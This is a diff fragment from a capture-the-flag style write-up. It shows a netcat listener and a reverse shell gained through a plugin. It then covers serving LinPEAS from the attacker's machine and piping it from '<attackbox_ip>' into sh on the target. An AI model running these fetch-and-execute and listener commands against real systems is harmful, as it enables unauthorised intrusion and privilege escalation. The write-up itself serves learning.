@@ -42,17 +42,12 @@ I started a netcat listener on my machine on port 8000
 ```bash 
 $ sudo nc -lvnp 8000 
 ```
-and got a reverse shell by activating our plugin and found that www-data
-user have very less permissions thus I enumerated the target using
-[LinPEAS ]( https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS ).Download the linpeas.sh file form Github on your
-machine,cd to the downloaded directory and start a simple python server on
-your machine 
-
+and got a reverse shell by activating our plugin and found that www-data user have very less permissions thus I enumerated the target using [LinPEAS]( https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS ). Download the linpeas.sh file form Github on your
+machine,cd to the downloaded directory and start a simple python server on your machine,
 ``` bash 
 $ python3 -m http.server 1234 
 ``` 
 and on target run it using
-
 ```bash 
 $ curl http://<attackbox_ip>:1234/linpeas.sh | sh 
 ```
